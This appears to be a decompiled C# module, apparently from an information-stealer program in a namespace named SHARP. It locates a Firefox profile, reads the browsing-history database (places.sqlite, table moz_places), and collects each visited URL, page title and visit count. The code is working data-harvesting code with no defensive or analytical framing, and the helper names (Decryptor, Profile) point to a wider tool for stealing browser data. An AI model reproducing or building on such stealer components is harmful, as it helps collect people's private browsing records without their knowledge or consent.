﻿using System;
using System.Collections.Generic;
using System.IO;

namespace SHARP.History
{
	// Token: 0x02000072 RID: 114
	internal class History
	{
		// Token: 0x06000280 RID: 640 RVA: 0x0000F758 File Offset: 0x0000D958
		public static List<Site> Get(string BrowserDir)
		{
			List<Site> list = new List<Site>();
			string profile = Profile.GetProfile(BrowserDir);
			if (profile == null)
			{
				return list;
			}
			SQLite sqlite = SQLite.ReadTable(Path.Combine(profile, "places.sqlite"), "moz_places");
			if (sqlite == null)
			{
				return list;
			}
			for (int i = 0; i < sqlite.GetRowCount(); i++)
			{
				Site item = default(Site);
				item.sUrl = Decryptor.GetUTF8(sqlite.GetValue(i, 1));
				item.sTitle = Decryptor.GetUTF8(sqlite.GetValue(i, 2));
				item.iCount = Convert.ToInt32(sqlite.GetValue(i, 4)) + 1;
				if (item.sTitle != "0")
				{
					list.Add(item);
				}
			}
			return list;
		}
	}
}
